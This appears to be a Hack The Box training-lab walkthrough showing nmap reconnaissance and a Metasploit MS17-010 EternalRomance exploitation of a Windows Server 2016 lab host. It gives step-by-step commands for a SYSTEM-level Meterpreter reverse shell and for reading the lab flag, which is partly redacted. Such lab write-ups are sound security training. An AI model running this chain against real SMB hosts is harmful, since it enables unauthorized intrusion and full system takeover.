### HTB Pentester Path <br>
### Metasploit Framework - Modules <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>
<br>

IP: 10.129.216.38

---

### Question 1:
Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.

Started with an nmap:
```diff
+ $ sudo nmap -sT -sC -sV -A -F 10.129.216.38
```

	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-29 14:26 CDT
	Nmap scan report for 10.129.216.38
	Host is up (0.0092s latency).
	Not shown: 96 closed tcp ports (conn-refused)
	PORT    STATE SERVICE      VERSION
	80/tcp  open  http         Microsoft IIS httpd 10.0
	|_http-title: 10.129.216.38 - /
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-server-header: Microsoft-IIS/10.0
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.94SVN%E=4%D=9/29%OT=80%CT=7%CU=37496%PV=Y%DS=2%DC=T%G=Y%TM=68DA
	OS:DD77%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%
	OS:TS=A)SEQ(SP=107%GCD=2%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M552NW8ST1
	OS:1%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST
	OS:11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80
	OS:%W=2000%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R
	OS:=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=
	OS:AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
	OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
	OS:%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=1
	OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
	
	Network Distance: 2 hops
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2025-09-29T19:26:39
	|_  start_date: 2025-09-29T18:48:51
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s
	| smb-os-discovery: 
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: MSF1-WIN01
	|   NetBIOS computer name: MSF1-WIN01\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-09-29T12:26:38-07:00
	
	TRACEROUTE (using proto 1/icmp)
	HOP RTT     ADDRESS
	1   9.28 ms 10.10.14.1
	2   9.35 ms 10.129.216.38

<br>

SMB is def vulnerable. Lets search for msf modules:
```diff
+ [msf] >> search EternalRomance
```

	Matching Modules
	================
	
	   #   Name                                  Disclosure Date  Rank    Check  Description
	   -   ----                                  ---------------  ----    -----  -----------
	   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
	   1     \_ target: Automatic                .                .       .      .
	   2     \_ target: PowerShell               .                .       .      .
	   3     \_ target: Native upload            .                .       .      .
	   4     \_ target: MOF upload               .                .       .      .
	   5     \_ AKA: ETERNALSYNERGY              .                .       .      .
	   6     \_ AKA: ETERNALROMANCE              .                .       .      .
	   7     \_ AKA: ETERNALCHAMPION             .                .       .      .
	   8     \_ AKA: ETERNALBLUE                 .                .       .      .
	   9   auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
	   10    \_ AKA: ETERNALSYNERGY              .                .       .      .
	   11    \_ AKA: ETERNALROMANCE              .                .       .      .
	   12    \_ AKA: ETERNALCHAMPION             .                .       .      .
	   13    \_ AKA: ETERNALBLUE                 .                .       .      .

<br>

```diff
+ [msf] >> use 0
```

	[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```diff
+ [msf] exploit(windows/smb/ms17_010_psexec) >> show options
```

	Module options (exploit/windows/smb/ms17_010_psexec):
	
	   Name                  Current Setting                                       Required  Description
	   ----                  ---------------                                       --------  -----------
	   DBGTRACE              false                                                 yes       Show extra debug trace info
	   LEAKATTEMPTS          99                                                    yes       How many times to try to leak transaction
	   NAMEDPIPE                                                                   no        A named pipe that can be connected to (leave blank for auto)
	   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named  yes       List of named pipes to check
	                         _pipes.txt
	   RHOSTS                                                                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit
	                                                                                         .html
	   RPORT                 445                                                   yes       The Target port (TCP)
	   SERVICE_DESCRIPTION                                                         no        Service description to be used on target for pretty listing
	   SERVICE_DISPLAY_NAME                                                        no        The service display name
	   SERVICE_NAME                                                                no        The service name
	   SHARE                 ADMIN$                                                yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder shar
	                                                                                         e
	   SMBDomain             .                                                     no        The Windows domain to use for authentication
	   SMBPass                                                                     no        The password for the specified username
	   SMBUser                                                                     no        The username to authenticate as
	
	
	Payload options (windows/meterpreter/reverse_tcp):
	
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
	   LHOST     85.9.195.222     yes       The listen address (an interface may be specified)
	   LPORT     4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Automatic

<br>

Just have to set the remote host and the local host:
```diff
+ [msf] exploit(windows/smb/ms17_010_psexec) >> set rhost 10.129.216.38
+ [msf] exploit(windows/smb/ms17_010_psexec) >> set lhost 10.10.15.149
```
```diff
+ [msf] exploit(windows/smb/ms17_010_psexec) >> exploit
```

	[*] Started reverse TCP handler on 10.10.15.149:4444 
	[*] 10.129.216.38:445 - Target OS: Windows Server 2016 Standard 14393
	[*] 10.129.216.38:445 - Built a write-what-where primitive...
	[+] 10.129.216.38:445 - Overwrite complete... SYSTEM session obtained!
	[*] 10.129.216.38:445 - Selecting PowerShell target
	[*] 10.129.216.38:445 - Executing the payload...
	[+] 10.129.216.38:445 - Service start timed out, OK if running a command or non-service executable...
	[*] Sending stage (177734 bytes) to 10.129.216.38
	[*] Meterpreter session 1 opened (10.10.15.149:4444 -> 10.129.216.38:49672) at 2025-09-29 15:07:30 -0500

<br>

Now some dir traversal to find the gold:
```diff
+ (Meterpreter 1)(C:\Windows\system32) > cd ../../
```

	(Meterpreter 1)(C:\) > dir
	Listing: C:\
	============
	
	Mode              Size    Type  Last modified              Name
	----              ----    ----  -------------              ----
	040777/rwxrwxrwx  0       dir   2020-10-05 18:18:31 -0500  $Recycle.Bin
	100666/rw-rw-rw-  1       fil   2016-07-16 08:18:08 -0500  BOOTNXT
	040777/rwxrwxrwx  0       dir   2020-10-02 19:22:46 -0500  Documents and Settings
	040777/rwxrwxrwx  0       dir   2016-07-16 08:23:21 -0500  PerfLogs
	040555/r-xr-xr-x  4096    dir   2022-05-16 07:08:21 -0500  Program Files
	040777/rwxrwxrwx  4096    dir   2022-05-16 07:08:21 -0500  Program Files (x86)
	040777/rwxrwxrwx  4096    dir   2020-10-02 12:28:44 -0500  ProgramData
	040777/rwxrwxrwx  0       dir   2022-05-16 06:36:24 -0500  Recovery
	040777/rwxrwxrwx  4096    dir   2022-05-16 06:27:11 -0500  System Volume Information
	040555/r-xr-xr-x  4096    dir   2020-10-05 20:51:25 -0500  Users
	040777/rwxrwxrwx  24576   dir   2020-10-05 20:43:19 -0500  Windows
	100444/r--r--r--  389408  fil   2016-11-20 18:42:45 -0600  bootmgr
	040777/rwxrwxrwx  0       dir   2020-10-05 20:43:14 -0500  inetpub
	000000/---------  0       fif   1969-12-31 18:00:00 -0600  pagefile.sys

<br>

```diff
+ (Meterpreter 1)(C:\) > cd Users
+ (Meterpreter 1)(C:\Users) > cd Administrator
+ (Meterpreter 1)(C:\Users\Administrator) > cd Desktop
+ (Meterpreter 1)(C:\Users\Administrator\Desktop) > ls
```

	Listing: C:\Users\Administrator\Desktop
	=======================================
	
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100666/rw-rw-rw-  282   fil   2020-10-05 18:18:25 -0500  desktop.ini
	100666/rw-rw-rw-  29    fil   2022-05-16 06:19:21 -0500  flag.txt

<br>

Sweet. Let's pop a shell and *type* it out.

```diff
+ (Meterpreter 1)(C:\Users\Administrator\Desktop) > shell
```

	Process 3292 created.
	Channel 1 created.
	Microsoft Windows [Version 10.0.14393]
	(c) 2016 Microsoft Corporation. All rights reserved.
```diff
+ C:\Users\Administrator\Desktop>type flag.txt
```

	HTB{MSF-W1nD0w5-3xP--edit--1t4t10n}

<br>

🚩 found **HTB{MSF-W1nD0w5-3x--edit--PL01t4t10n}**.
